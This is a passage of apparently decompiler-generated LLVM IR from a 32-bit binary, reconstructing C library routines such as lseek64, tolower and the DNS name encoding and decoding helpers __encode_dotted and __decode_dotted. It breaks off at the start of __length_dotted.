  uselistorder label %dec_label_pc_8057dff.outer, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_8057ce9, { 1, 0 }
  uselistorder label %dec_label_pc_8057cae, { 1, 0 }
  uselistorder label %dec_label_pc_8057c05, { 1, 0 }
  uselistorder label %dec_label_pc_8057b95, { 1, 0 }
}

define i32 @__libc_lseek64(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %esi.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_8057e4a = load i32, i32* @ebx, align 4
  store i32 %v0_8057e4a, i32* %stack_var_-12, align 4
  %v2_8057e52 = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_8057e52, i32* %esi.global-to-local, align 4
  %v1_8057e6c = call i32 @int80_syscall(i32 140)
  store i32 %v1_8057e6c, i32* %esi.global-to-local, align 4
  %tmp16 = icmp ult i32 %v1_8057e6c, -4095
  br i1 %tmp16, label %dec_label_pc_8057e86, label %dec_label_pc_8057e78

dec_label_pc_8057e78:                             ; preds = %entry
  %v1_8057e78 = call i32 @__errno_location(i32 %arg3)
  %v0_8057e7d = load i32, i32* %esi.global-to-local, align 4
  %v1_8057e7d = sub i32 0, %v0_8057e7d
  %v2_8057e7f = inttoptr i32 %v1_8057e78 to i32*
  store i32 %v1_8057e7d, i32* %v2_8057e7f, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8057e8a

dec_label_pc_8057e86:                             ; preds = %entry
  %v1_8057e86 = icmp eq i32 %v1_8057e6c, 0
  br i1 %v1_8057e86, label %dec_label_pc_8057e8f, label %dec_label_pc_8057e8a

dec_label_pc_8057e8a:                             ; preds = %dec_label_pc_8057e86, %dec_label_pc_8057e78
  %v0_8057e8a = phi i32 [ %v1_8057e6c, %dec_label_pc_8057e86 ], [ -1, %dec_label_pc_8057e78 ]
  %v1_8057e8c = ashr i32 %v0_8057e8a, 31
  br label %dec_label_pc_8057e97

dec_label_pc_8057e8f:                             ; preds = %dec_label_pc_8057e86
  %v3_8057e8f = load i32, i32* %stack_var_-20, align 4
  br label %dec_label_pc_8057e97

dec_label_pc_8057e97:                             ; preds = %dec_label_pc_8057e8a, %dec_label_pc_8057e8f
  %v0_8057e9d = phi i32 [ %v0_8057e8a, %dec_label_pc_8057e8a ], [ %v3_8057e8f, %dec_label_pc_8057e8f ]
  %storemerge = phi i32 [ %v1_8057e8c, %dec_label_pc_8057e8a ], [ %tmp, %dec_label_pc_8057e8f ]
  store i32 %storemerge, i32* @edx, align 4
  %v2_8057e9a = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8057e9a, i32* @ebx, align 4
  ret i32 %v0_8057e9d

; uselistorder directives
  uselistorder i32 %v1_8057e6c, { 1, 3, 0, 2 }
  uselistorder i32 31, { 21, 16, 22, 28, 29, 23, 24, 12, 3, 4, 1, 2, 11, 27, 17, 18, 19, 7, 8, 5, 6, 13, 9, 10, 25, 26, 20, 14, 15, 0 }
  uselistorder i32 (i32)* @__errno_location, { 57, 45, 71, 70, 69, 44, 43, 56, 55, 42, 25, 39, 54, 53, 18, 47, 24, 36, 13, 12, 11, 10, 9, 68, 8, 23, 22, 7, 21, 37, 49, 59, 58, 67, 66, 65, 35, 20, 19, 48, 17, 38, 52, 51, 50, 1, 41, 40, 14, 46, 6, 5, 64, 32, 31, 63, 29, 4, 16, 0, 28, 15, 62, 61, 34, 27, 26, 60, 3, 2, 72, 33, 30 }
  uselistorder i32 140, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8057e97, { 1, 0 }
}

define i32 @__GI_tolower(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @edx, align 4
  %v1_8057ea4 = add i32 %arg1, 128
  %v6_8057eaf = icmp ugt i32 %v1_8057ea4, 383
  br i1 %v6_8057eaf, label %dec_label_pc_8057eba, label %dec_label_pc_8057eb1

dec_label_pc_8057eb1:                             ; preds = %entry
  %v0_8057eb1 = load i32, i32* bitcast (i32** @global_var_805c4e0.492 to i32*), align 32
  %v2_8057eb6 = mul i32 %arg1, 2
  %v3_8057eb6 = add i32 %v0_8057eb1, %v2_8057eb6
  %v4_8057eb6 = inttoptr i32 %v3_8057eb6 to i16*
  %v5_8057eb6 = load i16, i16* %v4_8057eb6, align 2
  %v6_8057eb6 = sext i16 %v5_8057eb6 to i32
  store i32 %v6_8057eb6, i32* @edx, align 4
  br label %dec_label_pc_8057eba

dec_label_pc_8057eba:                             ; preds = %entry, %dec_label_pc_8057eb1
  %v0_8057eba = phi i32 [ %arg1, %entry ], [ %v6_8057eb6, %dec_label_pc_8057eb1 ]
  ret i32 %v0_8057eba

; uselistorder directives
  uselistorder i32 65536, { 1, 0, 2, 3, 4, 6, 5, 8, 7, 10, 9, 12, 11, 13, 14, 62, 65, 15, 16, 17, 18, 64, 19, 20, 21, 22, 25, 26, 24, 23, 27, 28, 29, 30, 33, 34, 32, 31, 35, 38, 37, 36, 39, 40, 41, 42, 43, 44, 45, 46, 48, 47, 49, 50, 53, 54, 55, 51, 56, 52, 58, 57, 59, 61, 60, 63 }
  uselistorder i32 128, { 18, 9, 11, 4, 10, 5, 6, 12, 0, 7, 8, 13, 14, 15, 16, 17, 3, 2, 19, 1 }
  uselistorder label %dec_label_pc_8057eba, { 1, 0 }
}

define i32 @__encode_dotted(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %v0_8057ec1 = load i32, i32* @edi, align 4
  %v0_8057ec2 = load i32, i32* @esi, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  %v4_8057ec9 = ptrtoint i8* %arg1 to i32
  store i32 %v4_8057ec9, i32* @edi, align 4
  %v1_8057f286 = icmp eq i8* %arg1, null
  br i1 %v1_8057f286, label %dec_label_pc_8057f31, label %dec_label_pc_8057f2c.lr.ph

dec_label_pc_8057f2c.lr.ph:                       ; preds = %entry
  br label %dec_label_pc_8057f2c

dec_label_pc_8057ecf:                             ; preds = %dec_label_pc_8057f2c
  %v5_8057ed4 = call i32 @__GI_strchr(i8* %v1_8057f2c, i32 46)
  %v1_8057edc = icmp eq i32 %v5_8057ed4, 0
  br i1 %v1_8057edc, label %dec_label_pc_8057ee8, label %dec_label_pc_8057ee2

dec_label_pc_8057ee2:                             ; preds = %dec_label_pc_8057ecf
  %v1_8057ee4 = load i32, i32* @edi, align 4
  %v2_8057ee4 = sub i32 %v5_8057ed4, %v1_8057ee4
  br label %dec_label_pc_8057ef6

dec_label_pc_8057ee8:                             ; preds = %dec_label_pc_8057ecf
  %v0_8057eeb = load i32, i32* @edi, align 4
  %v5_8057eeb = inttoptr i32 %v0_8057eeb to i8*
  %v3_8057eec = call i32 @strlen(i8* %v5_8057eeb)
  br label %dec_label_pc_8057ef6

dec_label_pc_8057ef6:                             ; preds = %dec_label_pc_8057ee2, %dec_label_pc_8057ee8
  %v0_8057f09 = phi i32 [ %v3_8057eec, %dec_label_pc_8057ee8 ], [ %v2_8057ee4, %dec_label_pc_8057ee2 ]
  store i32 %v0_8057f09, i32* @esi, align 4
  %v1_8057ef6 = icmp eq i32 %v0_8057f09, 0
  %v3_8057ef6 = trunc i32 %v0_8057f09 to i8
  br i1 %v1_8057ef6, label %dec_label_pc_8057f45, label %dec_label_pc_8057efa

dec_label_pc_8057efa:                             ; preds = %dec_label_pc_8057ef6
  %v1_8057efe = load i32, i32* %ebx.global-to-local, align 4
  %v2_8057efe = sub i32 %arg3, %v1_8057efe
  %v1_8057f00 = add i32 %v2_8057efe, -1
  %v7_8057f01 = icmp ult i32 %v0_8057f09, %v1_8057f00
  %v1_8057f03 = icmp eq i1 %v7_8057f01, false
  br i1 %v1_8057f03, label %dec_label_pc_8057f45, label %dec_label_pc_8057f05

dec_label_pc_8057f05:                             ; preds = %dec_label_pc_8057efa
  store i32 %arg2, i32* @edx, align 4
  %v4_8057f0b = add i32 %v1_8057efe, %arg2
  %v5_8057f0b = inttoptr i32 %v4_8057f0b to i8*
  store i8 %v3_8057ef6, i8* %v5_8057f0b, align 1
  %v0_8057f0e = load i32, i32* %ebx.global-to-local, align 4
  %v1_8057f0e = add i32 %v0_8057f0e, 1
  %v0_8057f10 = load i32, i32* @edx, align 4
  %v0_8057f12 = load i32, i32* @esi, align 4
  %v2_8057f13 = add i32 %v1_8057f0e, %v0_8057f10
  %v0_8057f15 = load i32, i32* @edi, align 4
  %v2_8057f16 = add i32 %v0_8057f12, %v1_8057f0e
  store i32 %v2_8057f16, i32* %ebx.global-to-local, align 4
  %tmp31 = inttoptr i32 %v2_8057f13 to i16*
  %v7_8057f19 = call i32 @memcpy(i16* %tmp31, i32 %v0_8057f15, i32 %v0_8057f12)
  %v1_8057f25 = add i32 %v5_8057ed4, 1
  br i1 %v1_8057edc, label %dec_label_pc_8057f31, label %dec_label_pc_8057f28

dec_label_pc_8057f28:                             ; preds = %dec_label_pc_8057f05
  store i32 %v1_8057f25, i32* @edi, align 4
  %v1_8057f28 = icmp eq i32 %v1_8057f25, 0
  br i1 %v1_8057f28, label %dec_label_pc_8057f31, label %dec_label_pc_8057f2c

dec_label_pc_8057f2c:                             ; preds = %dec_label_pc_8057f2c.lr.ph, %dec_label_pc_8057f28
  %v0_8057ed3 = phi i32 [ %v4_8057ec9, %dec_label_pc_8057f2c.lr.ph ], [ %v1_8057f25, %dec_label_pc_8057f28 ]
  %v1_8057f2c = inttoptr i32 %v0_8057ed3 to i8*
  %v2_8057f2c = load i8, i8* %v1_8057f2c, align 1
  %v3_8057f2c = icmp eq i8 %v2_8057f2c, 0
  %v1_8057f2f = icmp eq i1 %v3_8057f2c, false
  br i1 %v1_8057f2f, label %dec_label_pc_8057ecf, label %dec_label_pc_8057f31

dec_label_pc_8057f31:                             ; preds = %dec_label_pc_8057f28, %dec_label_pc_8057f2c, %dec_label_pc_8057f05, %entry
  %tmp32 = icmp slt i32 %arg3, 1
  br i1 %tmp32, label %dec_label_pc_8057f45, label %dec_label_pc_8057f38

dec_label_pc_8057f38:                             ; preds = %dec_label_pc_8057f31
  %v1_8057f3c = load i32, i32* %ebx.global-to-local, align 4
  %v2_8057f3c = add i32 %v1_8057f3c, %arg2
  %v3_8057f3c = inttoptr i32 %v2_8057f3c to i8*
  store i8 0, i8* %v3_8057f3c, align 1
  %v0_8057f40 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8057f40 = add i32 %v0_8057f40, 1
  br label %dec_label_pc_8057f48

dec_label_pc_8057f45:                             ; preds = %dec_label_pc_8057efa, %dec_label_pc_8057ef6, %dec_label_pc_8057f31
  br label %dec_label_pc_8057f48

dec_label_pc_8057f48:                             ; preds = %dec_label_pc_8057f38, %dec_label_pc_8057f45
  %storemerge4 = phi i32 [ %v1_8057f40, %dec_label_pc_8057f38 ], [ -1, %dec_label_pc_8057f45 ]
  store i32 %v0_8057ec2, i32* @esi, align 4
  store i32 %v0_8057ec1, i32* @edi, align 4
  ret i32 %storemerge4

; uselistorder directives
  uselistorder i8* %v1_8057f2c, { 1, 0 }
  uselistorder i32 %v1_8057f25, { 0, 2, 1 }
  uselistorder i32 %v0_8057f12, { 1, 0 }
  uselistorder i32 %v5_8057ed4, { 1, 0, 2 }
  uselistorder i32* %ebx.global-to-local, { 1, 2, 0, 3, 4, 5 }
  uselistorder i32 (i8*)* @strlen, { 3, 7, 6, 2, 1, 5, 4, 0, 8 }
  uselistorder i32 (i8*, i32)* @__GI_strchr, { 8, 9, 10, 0, 1, 2, 3, 4, 5, 6, 7, 11, 12 }
  uselistorder i32 46, { 2, 3, 0, 6, 1, 4, 5 }
  uselistorder i8* null, { 4, 3, 2, 7, 0, 1, 6, 8, 9, 5, 10, 11, 12 }
  uselistorder label %dec_label_pc_8057f48, { 1, 0 }
  uselistorder label %dec_label_pc_8057f45, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8057f31, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_8057f2c, { 1, 0 }
  uselistorder label %dec_label_pc_8057ef6, { 1, 0 }
}

define i32 @__decode_dotted(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %ebp.global-to-local = alloca i32, align 4
  %v0_8057f52 = load i32, i32* @esi, align 4
  %v4_8057f57 = icmp eq i32 %arg1, 0
  store i32 %arg2, i32* @edx, align 4
  br i1 %v4_8057f57, label %dec_label_pc_805801e, label %dec_label_pc_8057f66

dec_label_pc_8057f66:                             ; preds = %entry
  store i32 0, i32* %ebp.global-to-local, align 4
  store i32 0, i32* @ecx, align 4
  %v2_80580062541 = add i32 %arg2, %arg1
  %v3_80580062642 = inttoptr i32 %v2_80580062541 to i8*
  %v4_80580062743 = load i8, i8* %v3_80580062642, align 1
  %v1_805800a2945 = icmp eq i8 %v4_80580062743, 0
  %v1_805800c3046 = icmp eq i1 %v1_805800a2945, false
  br i1 %v1_805800c3046, label %dec_label_pc_8057f74.lr.ph, label %dec_label_pc_8058012

dec_label_pc_8057f74:                             ; preds = %dec_label_pc_8057f74.lr.ph, %dec_label_pc_8057f8d
  %v0_8057f7e = phi i32 [ %v0_8057f7e.pre, %dec_label_pc_8057f74.lr.ph ], [ %v4_8057f9e, %dec_label_pc_8057f8d ]
  %v8_8057f7437 = phi i1 [ %v8_8057f743151, %dec_label_pc_8057f74.lr.ph ], [ true, %dec_label_pc_8057f8d ]
  %v5_805800636.in = phi i8 [ %v5_80580062850.in, %dec_label_pc_8057f74.lr.ph ], [ %v4_8058006, %dec_label_pc_8057f8d ]
  %stack_var_-17.135 = phi i8 [ %stack_var_-17.1.ph49, %dec_label_pc_8057f74.lr.ph ], [ 0, %dec_label_pc_8057f8d ]
  %v0_8057f7b34 = phi i32 [ %v0_8057f7b.ph47, %dec_label_pc_8057f74.lr.ph ], [ %v2_8057fac, %dec_label_pc_8057f8d ]
  %v5_805800636 = zext i8 %v5_805800636.in to i32
  %v1_8057f7b = add i32 %v0_8057f7b34, 1
  store i32 %v1_8057f7b, i32* @esi, align 4
  %v3_8057f7e = select i1 %v8_8057f7437, i32 2, i32 1
  %v4_8057f7e = add i32 %v3_8057f7e, %v0_8057f7e
  store i32 %v4_8057f7e, i32* %ebp.global-to-local, align 4
  %v1_8057f81 = and i32 %v5_805800636, 192
  %v6_8057f86 = icmp eq i32 %v1_8057f81, 192
  %v1_8057f8b = icmp eq i1 %v6_8057f86, false
  br i1 %v1_8057f8b, label %dec_label_pc_8057fb0, label %dec_label_pc_8057f8d

dec_label_pc_8057f8d:                             ; preds = %dec_label_pc_8057f74
  %v2_8057f9a = add i32 %v1_8057f7b, %arg1
  %v3_8057f9a = inttoptr i32 %v2_8057f9a to i8*
  %v4_8057f9a = load i8, i8* %v3_8057f9a, align 1
  %v5_8057f9a = zext i8 %v4_8057f9a to i32
  %v4_8057f9e = add i32 %v3_8057f7e, %v4_8057f7e
  store i32 %v4_8057f9e, i32* %ebp.global-to-local, align 4
  %v1_8057fa1 = mul nuw nsw i32 %v5_805800636, 256
  %v2_8057fa4 = and i32 %v1_8057fa1, 16128
  %v2_8057fac = or i32 %v5_8057f9a, %v2_8057fa4
  store i32 %v2_8057fac, i32* @edx, align 4
  store i32 %v1_8057fcd.ph48, i32* @ecx, align 4
  %v2_8058006 = add i32 %v2_8057fac, %arg1
  %v3_8058006 = inttoptr i32 %v2_8058006 to i8*
  %v4_8058006 = load i8, i8* %v3_8058006, align 1
  %v1_805800a = icmp eq i8 %v4_8058006, 0
  %v1_805800c = icmp eq i1 %v1_805800a, false
  br i1 %v1_805800c, label %dec_label_pc_8057f74, label %dec_label_pc_8058012

dec_label_pc_8057fb0:                             ; preds = %dec_label_pc_8057f74
  %v2_8057fb0 = add i32 %v5_805800636, %v1_8057fcd.ph48
  %v1_8057fb5 = add i32 %v2_8057fb0, 1
  store i32 %v1_8057fb5, i32* @edi, align 4
  %v10_8057fb6 = icmp ult i32 %v1_8057fb5, %arg4
  %v1_8057fbe = icmp eq i1 %v10_8057fb6, false
  br i1 %v1_8057fbe, label %dec_label_pc_805801e, label %dec_label_pc_8057fc0

dec_label_pc_8057fc0:                             ; preds = %dec_label_pc_8057fb0
  %v2_8057fc6 = add i32 %v1_8057f7b, %arg1
  %v2_8057fcd = add i32 %v1_8057fcd.ph48, %arg3
  %v3_8057fd0 = inttoptr i32 %v2_8057fcd to i16*
  %v4_8057fd0 = call i32 @memcpy(i16* %v3_8057fd0, i32 %v2_8057fc6, i32 %v5_805800636)
  %v0_8057fdc = load i32, i32* %ebp.global-to-local, align 4
  %v0_8057fe5 = load i32, i32* @esi, align 4
  %v2_8057fe5 = add i32 %v0_8057fe5, %v5_805800636
  store i32 %v2_8057fe5, i32* @edx, align 4
  %v1_8057fec = icmp eq i1 %v8_8057f7437, false
  %v2_8057fdc = select i1 %v1_8057fec, i32 %v5_805800636, i32 0
  %v4_8057fec = add i32 %v0_8057fdc, %v2_8057fdc
  store i32 %v4_8057fec, i32* %ebp.global-to-local, align 4
  %v4_8057ffd = add i32 %v2_8057fb0, %arg3
  %v5_8057ffd = inttoptr i32 %v4_8057ffd to i8*
  store i8 46, i8* %v5_8057ffd, align 1
  %v0_8058000.pre = load i32, i32* @edi, align 4
  %v1_8058006.pre.pre = load i32, i32* @edx, align 4
  store i32 %v0_8058000.pre, i32* @ecx, align 4
  %v2_805800625 = add i32 %v1_8058006.pre.pre, %arg1
  %v3_805800626 = inttoptr i32 %v2_805800625 to i8*
  %v4_805800627 = load i8, i8* %v3_805800626, align 1
  %v1_805800a29 = icmp eq i8 %v4_805800627, 0
  %v1_805800c30 = icmp eq i1 %v1_805800a29, false
  %v8_8057f7431 = icmp eq i8 %stack_var_-17.135, 0
  %v0_8057f7e.pre.pre = load i32, i32* %ebp.global-to-local, align 4
  br i1 %v1_805800c30, label %dec_label_pc_8057f74.lr.ph, label %dec_label_pc_8058012

dec_label_pc_8057f74.lr.ph:                       ; preds = %dec_label_pc_8057fc0, %dec_label_pc_8057f66
  %v0_8057f7e.pre = phi i32 [ 0, %dec_label_pc_8057f66 ], [ %v0_8057f7e.pre.pre, %dec_label_pc_8057fc0 ]
  %v8_8057f743151 = phi i1 [ false, %dec_label_pc_8057f66 ], [ %v8_8057f7431, %dec_label_pc_8057fc0 ]
  %v5_80580062850.in = phi i8 [ %v4_80580062743, %dec_label_pc_8057f66 ], [ %v4_805800627, %dec_label_pc_8057fc0 ]
  %stack_var_-17.1.ph49 = phi i8 [ 1, %dec_label_pc_8057f66 ], [ %stack_var_-17.135, %dec_label_pc_8057fc0 ]
  %v1_8057fcd.ph48 = phi i32 [ 0, %dec_label_pc_8057f66 ], [ %v0_8058000.pre, %dec_label_pc_8057fc0 ]
  %v0_8057f7b.ph47 = phi i32 [ %arg2, %dec_label_pc_8057f66 ], [ %v1_8058006.pre.pre, %dec_label_pc_8057fc0 ]
  br label %dec_label_pc_8057f74

dec_label_pc_8058012:                             ; preds = %dec_label_pc_8057fc0, %dec_label_pc_8057f8d, %dec_label_pc_8057f66
  %v0_8058017 = phi i32 [ 0, %dec_label_pc_8057f66 ], [ %v4_8057f9e, %dec_label_pc_8057f8d ], [ %v0_8057f7e.pre.pre, %dec_label_pc_8057fc0 ]
  %v8_8057f74.lcssa = phi i1 [ false, %dec_label_pc_8057f66 ], [ true, %dec_label_pc_8057f8d ], [ %v8_8057f7431, %dec_label_pc_8057fc0 ]
  %v2_8058019 = zext i1 %v8_8057f74.lcssa to i32
  %v3_8058019 = add i32 %v0_8058017, 1
  %v4_8058019 = add i32 %v3_8058019, %v2_8058019
  br label %dec_label_pc_8058021

dec_label_pc_805801e:                             ; preds = %dec_label_pc_8057fb0, %entry
  br label %dec_label_pc_8058021

dec_label_pc_8058021:                             ; preds = %dec_label_pc_8058012, %dec_label_pc_805801e
  %storemerge = phi i32 [ %v4_8058019, %dec_label_pc_8058012 ], [ -1, %dec_label_pc_805801e ]
  store i32 %v0_8057f52, i32* @esi, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_8057fcd.ph48, { 2, 1, 0 }
  uselistorder i8 %v4_8058006, { 1, 0 }
  uselistorder i32 %v2_8057fac, { 0, 2, 1 }
  uselistorder i32 %v4_8057f9e, { 0, 2, 1 }
  uselistorder i32 %v5_805800636, { 2, 4, 1, 3, 5, 0 }
  uselistorder i32* %ebp.global-to-local, { 0, 1, 3, 2, 4, 5 }
  uselistorder i8 1, { 2, 15, 18, 5, 0, 17, 11, 1, 12, 13, 6, 7, 8, 9, 3, 4, 14, 16, 10 }
  uselistorder i8 46, { 3, 4, 2, 0, 5, 1 }
  uselistorder i32 (i16*, i32, i32)* @memcpy, { 6, 7, 8, 9, 10, 11, 12, 16, 0, 1, 17, 18, 20, 14, 15, 13, 2, 3, 4, 19, 5 }
  uselistorder i32* @edi, { 3, 189, 190, 21, 191, 192, 193, 20, 194, 195, 196, 2, 0, 197, 198, 199, 200, 201, 202, 203, 204, 205, 206, 207, 208, 209, 210, 211, 29, 5, 4, 30, 31, 32, 33, 34, 37, 35, 36, 212, 7, 213, 8, 214, 215, 6, 216, 217, 218, 219, 224, 225, 1, 220, 221, 222, 223, 226, 227, 228, 229, 108, 9, 109, 110, 111, 230, 231, 239, 240, 241, 261, 262, 263, 264, 265, 266, 267, 268, 269, 270, 271, 168, 169, 170, 171, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 10, 123, 124, 125, 126, 127, 128, 129, 343, 344, 345, 11, 346, 347, 350, 351, 300, 301, 302, 45, 46, 47, 352, 353, 368, 165, 12, 166, 167, 38, 39, 40, 41, 42, 43, 44, 180, 181, 182, 183, 184, 310, 311, 312, 313, 314, 315, 316, 317, 318, 319, 320, 321, 322, 323, 324, 48, 49, 50, 51, 52, 53, 54, 325, 326, 327, 328, 329, 330, 331, 332, 13, 333, 334, 335, 336, 337, 272, 273, 14, 274, 275, 276, 277, 278, 279, 280, 288, 289, 290, 291, 292, 130, 131, 15, 132, 366, 367, 133, 134, 135, 16, 250, 251, 242, 243, 244, 245, 246, 247, 248, 249, 55, 56, 57, 252, 253, 254, 136, 137, 138, 139, 140, 141, 142, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 17, 157, 26, 27, 28, 143, 18, 144, 145, 362, 363, 364, 365, 255, 256, 257, 258, 259, 260, 158, 159, 160, 161, 232, 233, 234, 235, 236, 237, 238, 348, 349, 185, 186, 298, 299, 58, 59, 60, 303, 304, 359, 360, 361, 61, 19, 62, 63, 64, 65, 305, 306, 66, 67, 68, 354, 355, 356, 357, 358, 69, 70, 71, 74, 72, 73, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 162, 163, 164, 172, 173, 174, 175, 176, 177, 178, 179, 22, 23, 24, 25, 187, 188, 281, 282, 283, 284, 285, 286, 287, 293, 294, 295, 296, 297, 307, 308, 309, 338, 339, 340, 341, 342 }
  uselistorder i32 256, { 5, 6, 7, 8, 9, 46, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 45, 21, 22, 23, 24, 25, 0, 1, 26, 2, 47, 27, 28, 53, 29, 30, 4, 50, 51, 3, 31, 32, 33, 34, 48, 35, 36, 37, 38, 39, 40, 41, 42, 49, 54, 43, 52, 44 }
  uselistorder i1 true, { 2, 4, 8, 9, 10, 11, 12, 13, 3, 6, 7, 0, 5, 1 }
  uselistorder i32* @edx, { 4, 166, 167, 168, 169, 170, 171, 172, 17, 176, 174, 175, 177, 178, 179, 180, 181, 182, 183, 45, 49, 46, 47, 48, 184, 185, 186, 187, 188, 189, 190, 197, 191, 192, 193, 194, 195, 196, 1, 18, 155, 98, 99, 198, 100, 101, 102, 103, 104, 212, 199, 200, 201, 216, 217, 218, 219, 437, 5, 2, 19, 156, 105, 106, 202, 203, 6, 204, 205, 206, 207, 107, 108, 109, 110, 111, 112, 506, 507, 508, 509, 7, 510, 511, 443, 164, 444, 52, 513, 50, 514, 445, 517, 518, 525, 524, 515, 147, 80, 148, 149, 150, 151, 152, 153, 51, 448, 449, 8, 450, 451, 452, 453, 454, 455, 456, 457, 458, 459, 460, 461, 462, 9, 463, 464, 446, 447, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 10, 68, 69, 70, 465, 466, 467, 468, 469, 470, 471, 472, 473, 474, 475, 476, 477, 478, 479, 480, 481, 482, 483, 484, 485, 486, 487, 488, 489, 11, 490, 491, 492, 493, 494, 520, 154, 220, 221, 223, 0, 173, 222, 436, 113, 208, 209, 210, 71, 211, 114, 115, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 16, 133, 134, 116, 135, 12, 136, 137, 139, 13, 140, 141, 142, 143, 144, 44, 14, 138, 516, 213, 214, 215, 15, 145, 438, 439, 512, 165, 519, 435, 521, 505, 72, 440, 441, 73, 432, 442, 74, 522, 523, 75, 76, 77, 78, 79, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 146, 157, 158, 159, 160, 161, 162, 163, 20, 21, 22, 24, 25, 23, 26, 27, 28, 29, 30, 32, 31, 33, 34, 35, 37, 36, 38, 39, 40, 41, 42, 43, 224, 225, 226, 227, 228, 229, 230, 231, 232, 233, 234, 235, 236, 237, 238, 239, 240, 241, 242, 243, 244, 245, 246, 247, 248, 249, 250, 251, 252, 253, 254, 255, 256, 257, 258, 259, 260, 261, 262, 263, 264, 265, 266, 267, 268, 269, 270, 271, 272, 273, 274, 275, 276, 277, 278, 279, 280, 281, 282, 283, 284, 285, 286, 287, 288, 289, 290, 291, 292, 293, 294, 295, 296, 297, 298, 299, 300, 301, 302, 303, 304, 305, 306, 307, 308, 309, 310, 311, 312, 313, 314, 315, 316, 317, 318, 319, 320, 321, 322, 323, 324, 325, 326, 327, 328, 329, 330, 331, 332, 333, 334, 335, 336, 337, 338, 339, 340, 341, 342, 343, 344, 345, 346, 347, 348, 349, 350, 351, 352, 353, 354, 355, 356, 357, 358, 359, 360, 361, 362, 363, 364, 365, 366, 367, 368, 369, 370, 371, 372, 373, 374, 375, 376, 377, 378, 379, 380, 381, 382, 383, 384, 385, 386, 387, 388, 389, 390, 391, 392, 393, 394, 395, 396, 397, 398, 399, 400, 401, 402, 403, 404, 405, 406, 407, 408, 409, 410, 411, 412, 413, 414, 415, 416, 417, 418, 419, 420, 421, 422, 423, 424, 425, 426, 427, 428, 429, 430, 431, 433, 434, 495, 496, 497, 498, 500, 504, 499, 502, 503, 3, 501, 526 }
  uselistorder i32* @esi, { 246, 247, 248, 249, 250, 251, 35, 252, 253, 254, 255, 256, 257, 258, 259, 260, 261, 262, 263, 264, 265, 266, 267, 268, 269, 270, 271, 36, 51, 52, 10, 5, 59, 53, 56, 54, 55, 6, 57, 58, 272, 11, 273, 274, 277, 275, 276, 284, 278, 279, 280, 281, 282, 283, 285, 286, 287, 288, 289, 290, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 12, 143, 144, 13, 297, 298, 300, 299, 7, 301, 302, 325, 326, 327, 328, 329, 330, 0, 37, 331, 332, 333, 334, 335, 336, 225, 226, 227, 228, 229, 389, 390, 391, 392, 337, 338, 145, 146, 147, 14, 148, 149, 150, 151, 152, 153, 154, 357, 358, 359, 71, 72, 73, 393, 394, 395, 396, 397, 405, 408, 409, 410, 216, 217, 218, 219, 220, 221, 222, 398, 403, 404, 60, 61, 62, 63, 64, 65, 239, 240, 241, 1, 242, 243, 244, 66, 67, 68, 69, 70, 360, 365, 15, 366, 367, 368, 369, 370, 371, 372, 361, 362, 363, 364, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 373, 374, 375, 376, 377, 378, 379, 380, 381, 382, 383, 16, 384, 38, 385, 386, 387, 388, 339, 340, 341, 344, 345, 346, 347, 348, 349, 350, 351, 352, 411, 17, 412, 413, 155, 18, 156, 39, 32, 342, 343, 355, 356, 223, 224, 420, 421, 157, 158, 159, 160, 161, 162, 163, 313, 19, 8, 303, 307, 308, 309, 310, 20, 33, 311, 312, 304, 305, 306, 89, 21, 90, 91, 314, 22, 315, 316, 164, 165, 166, 167, 24, 168, 2, 170, 171, 172, 173, 23, 174, 175, 169, 176, 177, 178, 179, 3, 180, 181, 182, 183, 184, 185, 186, 34, 25, 187, 188, 26, 192, 193, 194, 195, 196, 197, 198, 199, 200, 201, 202, 203, 204, 205, 27, 206, 207, 208, 28, 50, 189, 4, 190, 191, 399, 400, 401, 402, 414, 415, 416, 417, 418, 419, 317, 318, 319, 320, 29, 321, 322, 323, 324, 209, 210, 211, 212, 291, 292, 293, 294, 30, 31, 295, 296, 406, 407, 353, 354, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 105, 103, 104, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 9, 124, 125, 126, 127, 128, 129, 130, 131, 132, 213, 214, 215, 230, 231, 232, 233, 234, 235, 236, 237, 238, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 245, 422 }
  uselistorder i32 %arg1, { 1, 3, 2, 4, 0, 5 }
  uselistorder label %dec_label_pc_8058021, { 1, 0 }
}

define i32 @__length_dotted(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_805803a = icmp eq i32 %arg1, 0
  br i1 %v1_805803a, label %dec_label_pc_8058069, label %dec_label_pc_805805a.preheader

